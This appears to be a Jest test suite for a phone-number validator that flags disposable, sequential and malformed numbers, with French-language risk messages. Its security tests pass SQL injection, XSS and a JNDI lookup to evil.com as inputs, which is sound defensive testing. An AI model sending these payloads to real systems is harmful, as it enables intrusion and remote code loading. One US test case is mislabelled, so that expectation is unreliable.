import { PhoneNumberValidator, PhoneValidationResult } from '../phoneNumberValidation';

describe('PhoneNumberValidator', () => {
  describe('validate', () => {
    describe('basic validation', () => {
      it('should validate valid French mobile numbers', () => {
        const validNumbers = [
          '+33612345678',
          '+33687654321',
          '+33755555555',
          '+33666123456',
        ];

        validNumbers.forEach(number => {
          const result = PhoneNumberValidator.validate(number, 'FR');
          expect(result.isValid).toBe(true);
          expect(result.riskScore).toBeLessThan(30);
        });
      });

      it('should validate valid US numbers', () => {
        const validNumbers = [
          '+14155552671',
          '+12125551234',
          '+13105555678',
        ];

        validNumbers.forEach(number => {
          const result = PhoneNumberValidator.validate(number, 'US');
          expect(result.isValid).toBe(true);
          expect(result.riskScore).toBeLessThan(30);
        });
      });

      it('should validate valid UK numbers', () => {
        const validNumbers = [
          '+447400123456',
          '+447123456789',
          '+447987654321',
        ];

        validNumbers.forEach(number => {
          const result = PhoneNumberValidator.validate(number, 'GB');
          expect(result.isValid).toBe(true);
          expect(result.riskScore).toBeLessThan(30);
        });
      });

      it('should reject numbers that are too short', () => {
        const shortNumbers = ['123', '+33', '12345'];

        shortNumbers.forEach(number => {
          const result = PhoneNumberValidator.validate(number, 'FR');
          expect(result.isValid).toBe(false);
          expect(result.reason).toBe('Numéro trop court');
        });
      });

      it('should reject empty or null numbers', () => {
        const invalidNumbers = ['', null as any, undefined as any];

        invalidNumbers.forEach(number => {
          const result = PhoneNumberValidator.validate(number, 'FR');
          expect(result.isValid).toBe(false);
          expect(result.reason).toBe('Numéro trop court');
        });
      });
    });

    describe('disposable number detection', () => {
      it('should detect French disposable numbers', () => {
        const disposableNumbers = [
          '+33703456789', // Online SMS
          '+33775555555', // Virtual Number
          '+33785432109', // Temp SMS
        ];

        disposableNumbers.forEach(number => {
          const result = PhoneNumberValidator.validate(number, 'FR');
          expect(result.isDisposable).toBe(true);
          expect(result.riskScore).toBeGreaterThanOrEqual(50);
          expect(result.reason).toContain('virtuel');
          expect(result.suggestions).toContain('Utilisez votre numéro personnel');
        });
      });

      it('should detect US disposable numbers', () => {
        const disposableNumbers = [
          '+12675551234', // TextNow
          '+13325551234', // Talkatone  
          '+14695551234', // Google Voice
          '+15675551234', // TextFree
        ];

        disposableNumbers.forEach(number => {
          const result = PhoneNumberValidator.validate(number, 'US');
          expect(result.isDisposable).toBe(true);
          expect(result.riskScore).toBeGreaterThanOrEqual(50);
        });
      });

      it('should detect UK disposable numbers', () => {
        const disposableNumbers = [
          '+447915551234', // Virtual UK
          '+447845551234', // Temp UK
        ];

        disposableNumbers.forEach(number => {
          const result = PhoneNumberValidator.validate(number, 'GB');
          expect(result.isDisposable).toBe(true);
          expect(result.riskScore).toBeGreaterThanOrEqual(50);
        });
      });

      it('should not flag legitimate numbers as disposable', () => {
        const legitimateNumbers = [
          '+33612345678', // Normal French mobile
          '+14155552671', // Normal US number
          '+447400123456', // Normal UK mobile
        ];

        legitimateNumbers.forEach((number, index) => {
          const countryCodes = ['FR', 'US', 'GB'];
          const result = PhoneNumberValidator.validate(number, countryCodes[index]);
          expect(result.isDisposable).toBe(false);
        });
      });
    });

    describe('suspicious pattern detection', () => {
      it('should detect repeated digits', () => {
        const suspiciousNumbers = [
          '+33611111111', // All 1s
          '+33622222222', // All 2s
          '+33699999999', // All 9s
          '+33600000000', // All 0s
        ];

        suspiciousNumbers.forEach(number => {
          const result = PhoneNumberValidator.validate(number, 'FR');
          expect(result.isSuspicious).toBe(true);
          expect(result.riskScore).toBeGreaterThanOrEqual(30);
          expect(result.reason).toBe('Format de numéro suspect');
        });
      });

      it('should detect sequential numbers', () => {
        const sequentialNumbers = [
          '+33612345678', // Sequential ascending
          '+33687654321', // Sequential descending  
          '+33601234567', // Sequential in middle
        ];

        sequentialNumbers.forEach(number => {
          const result = PhoneNumberValidator.validate(number, 'FR');
          expect(result.isSuspicious).toBe(true);
          expect(result.riskScore).toBeGreaterThanOrEqual(20);
          expect(result.suggestions).toContain('Évitez les numéros séquentiels');
        });
      });

      it('should not flag normal patterns as suspicious', () => {
        const normalNumbers = [
          '+33687429315', // Mixed digits
          '+33612847395', // No clear pattern
          '+33675839241', // Random-like
        ];

        normalNumbers.forEach(number => {
          const result = PhoneNumberValidator.validate(number, 'FR');
          expect(result.isSuspicious).toBe(false);
        });
      });

      it('should detect numbers with many zeros', () => {
        const zeroNumbers = [
          '+33600000012', // Many zeros
          '+14155500000', // Zeros at end
        ];

        zeroNumbers.forEach((number, index) => {
          const countryCodes = ['FR', 'US'];
          const result = PhoneNumberValidator.validate(number, countryCodes[index]);
          expect(result.isSuspicious).toBe(true);
          expect(result.riskScore).toBeGreaterThanOrEqual(30);
        });
      });
    });

    describe('country-specific validation', () => {
      it('should enforce French mobile number format', () => {
        const invalidFrenchNumbers = [
          '+33512345678', // Starts with 5 (landline)
          '+33112345678', // Starts with 1 (invalid)
          '+33812345678', // Starts with 8 (special)
          '+33912345678', // Starts with 9 (special)
        ];

        invalidFrenchNumbers.forEach(number => {
          const result = PhoneNumberValidator.validate(number, 'FR');
          expect(result.isValid).toBe(false);
          expect(result.reason).toBe('Format invalide pour un numéro français');
        });
      });

      it('should enforce US NANP format', () => {
        const invalidUSNumbers = [
          '+11555551234', // Area code starts with 1
          '+10555551234', // Area code starts with 0  
          '+14155551234', // Exchange starts with 1
          '+14150551234', // Exchange starts with 0
        ];

        invalidUSNumbers.forEach(number => {
          const result = PhoneNumberValidator.validate(number, 'US');
          expect(result.isValid).toBe(false);
          expect(result.reason).toBe('Format invalide pour un numéro nord-américain');
        });
      });

      it('should enforce UK mobile format', () => {
        const invalidUKNumbers = [
          '+446400123456', // Doesn't start with 7
          '+441234567890', // Landline format
          '+448000123456', // Freephone
        ];

        invalidUKNumbers.forEach(number => {
          const result = PhoneNumberValidator.validate(number, 'GB');
          expect(result.isValid).toBe(false);
          expect(result.reason).toBe('Format invalide pour un numéro britannique');
        });
      });

      it('should handle unsupported countries gracefully', () => {
        const number = '+49151234567890'; // German number
        const result = PhoneNumberValidator.validate(number, 'DE');
        
        // Should not fail country-specific validation for unsupported countries
        expect(result.isValid).toBe(true);
      });
    });

    describe('risk scoring', () => {
      it('should calculate cumulative risk scores', () => {
        // Number that hits multiple risk factors
        const highRiskNumber = '+33703333333'; // Disposable (50) + Suspicious (30) = 80

        const result = PhoneNumberValidator.validate(highRiskNumber, 'FR');
        
        expect(result.riskScore).toBeGreaterThanOrEqual(70);
        expect(result.isValid).toBe(false); // High risk should be invalid
        expect(result.isDisposable).toBe(true);
        expect(result.isSuspicious).toBe(true);
      });

      it('should cap risk score at 100', () => {
        const extremeNumber = '+33701234567'; // Multiple risk factors
        const result = PhoneNumberValidator.validate(extremeNumber, 'FR');
        
        expect(result.riskScore).toBeLessThanOrEqual(100);
      });

      it('should mark high-risk numbers as invalid', () => {
        const highRiskNumbers = [
          '+33703333333', // Disposable + repeated digits
          '+33781111111', // Disposable + repeated digits
        ];

        highRiskNumbers.forEach(number => {
          const result = PhoneNumberValidator.validate(number, 'FR');
          expect(result.isValid).toBe(false);
          expect(result.riskScore).toBeGreaterThanOrEqual(70);
          expect(result.reason).toContain('risque');
        });
      });

      it('should allow low-risk numbers', () => {
        const lowRiskNumbers = [
          '+33687429315',
          '+33612847395',
          '+33675839241',
        ];

        lowRiskNumbers.forEach(number => {
          const result = PhoneNumberValidator.validate(number, 'FR');
          expect(result.isValid).toBe(true);
          expect(result.riskScore).toBeLessThan(30);
        });
      });
    });

    describe('suggestions', () => {
      it('should provide helpful suggestions for disposable numbers', () => {
        const disposableNumber = '+33703456789';
        const result = PhoneNumberValidator.validate(disposableNumber, 'FR');
        
        expect(result.suggestions).toContain('Utilisez votre numéro personnel');
      });

      it('should provide suggestions for sequential numbers', () => {
        const sequentialNumber = '+33612345678';
        const result = PhoneNumberValidator.validate(sequentialNumber, 'FR');
        
        expect(result.suggestions).toContain('Évitez les numéros séquentiels');
      });

      it('should not provide suggestions for valid numbers', () => {
        const validNumber = '+33687429315';
        const result = PhoneNumberValidator.validate(validNumber, 'FR');
        
        expect(result.suggestions).toEqual([]);
      });
    });
  });

  describe('getRiskMessage', () => {
    it('should return null for low-risk numbers', () => {
      const lowRiskResult: PhoneValidationResult = {
        isValid: true,
        isSuspicious: false,
        isDisposable: false,
        riskScore: 15,
      };

      const message = PhoneNumberValidator.getRiskMessage(lowRiskResult);
      expect(message).toBeNull();
    });

    it('should return disposable message for disposable numbers', () => {
      const disposableResult: PhoneValidationResult = {
        isValid: false,
        isSuspicious: false,
        isDisposable: true,
        riskScore: 50,
      };

      const message = PhoneNumberValidator.getRiskMessage(disposableResult);
      expect(message).toBe('Ce numéro semble être temporaire. Utilisez votre numéro personnel pour continuer.');
    });

    it('should return suspicious message for suspicious numbers', () => {
      const suspiciousResult: PhoneValidationResult = {
        isValid: true,
        isSuspicious: true,
        isDisposable: false,
        riskScore: 40,
      };

      const message = PhoneNumberValidator.getRiskMessage(suspiciousResult);
      expect(message).toBe('Ce numéro présente des caractéristiques inhabituelles.');
    });

    it('should return high-risk message for very high-risk numbers', () => {
      const highRiskResult: PhoneValidationResult = {
        isValid: false,
        isSuspicious: false,
        isDisposable: false,
        riskScore: 80,
      };

      const message = PhoneNumberValidator.getRiskMessage(highRiskResult);
      expect(message).toBe('Ce numéro ne peut pas être utilisé pour la vérification.');
    });

    it('should prioritize disposable message over suspicious', () => {
      const bothResult: PhoneValidationResult = {
        isValid: false,
        isSuspicious: true,
        isDisposable: true,
        riskScore: 70,
      };

      const message = PhoneNumberValidator.getRiskMessage(bothResult);
      expect(message).toBe('Ce numéro semble être temporaire. Utilisez votre numéro personnel pour continuer.');
    });
  });

  describe('edge cases and error handling', () => {
    it('should handle malformed phone numbers gracefully', () => {
      const malformedNumbers = [
        'not-a-number',
        '+++33612345678',
        'abc123def456',
        '🤔+33612345678',
      ];

      malformedNumbers.forEach(number => {
        const result = PhoneNumberValidator.validate(number, 'FR');
        
        // Should not throw errors
        expect(result).toBeDefined();
        expect(typeof result.isValid).toBe('boolean');
        expect(typeof result.riskScore).toBe('number');
      });
    });

    it('should handle very long numbers', () => {
      const longNumber = '+3361234567890123456789';
      const result = PhoneNumberValidator.validate(longNumber, 'FR');
      
      expect(result).toBeDefined();
      expect(result.isValid).toBe(false); // Should be invalid due to format
    });

    it('should handle numbers with various formatting', () => {
      const formattedNumbers = [
        '+33 6 12 34 56 78',
        '+33-6-12-34-56-78',
        '+33.6.12.34.56.78',
        '+33 (6) 12-34-56-78',
      ];

      formattedNumbers.forEach(number => {
        const result = PhoneNumberValidator.validate(number, 'FR');
        
        // Should handle formatting and validate based on digits
        expect(result).toBeDefined();
        expect(typeof result.isValid).toBe('boolean');
      });
    });

    it('should handle numbers without country codes', () => {
      const localNumbers = [
        '0612345678', // French format with leading 0
        '6123456789', // Without leading 0
      ];

      localNumbers.forEach(number => {
        const result = PhoneNumberValidator.validate(number, 'FR');
        
        expect(result).toBeDefined();
        // Should handle removal of leading 0 in country-specific validation
      });
    });

    it('should be case-insensitive for country codes', () => {
      const number = '+33612345678';
      
      const resultLower = PhoneNumberValidator.validate(number, 'fr');
      const resultUpper = PhoneNumberValidator.validate(number, 'FR');
      const resultMixed = PhoneNumberValidator.validate(number, 'Fr');
      
      // All should work the same way (if implementation supports it)
      expect(resultLower).toBeDefined();
      expect(resultUpper).toBeDefined();
      expect(resultMixed).toBeDefined();
    });

    it('should handle concurrent validations', () => {
      const numbers = Array.from({ length: 100 }, (_, i) => `+33612${i.toString().padStart(6, '0')}`);
      
      const results = numbers.map(number => 
        PhoneNumberValidator.validate(number, 'FR')
      );
      
      // All should complete without errors
      expect(results).toHaveLength(100);
      results.forEach(result => {
        expect(result).toBeDefined();
        expect(typeof result.isValid).toBe('boolean');
      });
    });
  });

  describe('performance and boundary conditions', () => {
    it('should handle extremely short numbers', () => {
      const shortNumbers = ['1', '12', '+3', '+33'];
      
      shortNumbers.forEach(number => {
        const result = PhoneNumberValidator.validate(number, 'FR');
        expect(result.isValid).toBe(false);
        expect(result.reason).toBe('Numéro trop court');
      });
    });

    it('should handle numbers at exact length boundaries', () => {
      const boundaryNumbers = [
        '123456', // Exactly 6 characters (minimum)
        '1234567', // Just over minimum
      ];

      boundaryNumbers.forEach(number => {
        const result = PhoneNumberValidator.validate(number, 'FR');
        expect(result).toBeDefined();
        expect(typeof result.isValid).toBe('boolean');
      });
    });

    it('should handle special characters and unicode', () => {
      const specialNumbers = [
        '+33612345678\u200B', // Zero-width space
        '+33612345678\n', // Newline
        '+33612345678\t', // Tab
        '\u202A+33612345678\u202C', // Unicode directional marks
      ];

      specialNumbers.forEach(number => {
        const result = PhoneNumberValidator.validate(number, 'FR');
        expect(result).toBeDefined();
        expect(typeof result.isValid).toBe('boolean');
      });
    });

    it('should validate consistently with same input', () => {
      const number = '+33612345678';
      
      // Run validation multiple times
      const results = Array.from({ length: 10 }, () => 
        PhoneNumberValidator.validate(number, 'FR')
      );
      
      // All results should be identical
      const firstResult = results[0];
      results.forEach(result => {
        expect(result).toEqual(firstResult);
      });
    });
  });

  describe('security considerations', () => {
    it('should not be vulnerable to RegExp DoS', () => {
      // Test with potentially problematic input
      const problematicNumbers = [
        '+' + '1'.repeat(1000), // Very long repeated digits
        '+33' + '123456'.repeat(100), // Very long sequential pattern
        '+33' + '0'.repeat(500), // Many zeros
      ];

      problematicNumbers.forEach(number => {
        const startTime = Date.now();
        const result = PhoneNumberValidator.validate(number, 'FR');
        const endTime = Date.now();
        
        // Should complete quickly (within 100ms)
        expect(endTime - startTime).toBeLessThan(100);
        expect(result).toBeDefined();
      });
    });

    it('should handle injection attempts', () => {
      const injectionNumbers = [
        "+33612345678'; DROP TABLE users; --",
        '+33612345678<script>alert("xss")</script>',
        '+33612345678\x00null',
        '+33612345678${jndi:ldap://evil.com}',
      ];

      injectionNumbers.forEach(number => {
        const result = PhoneNumberValidator.validate(number, 'FR');
        
        // Should handle safely without throwing
        expect(result).toBeDefined();
        expect(typeof result.isValid).toBe('boolean');
      });
    });
  });
});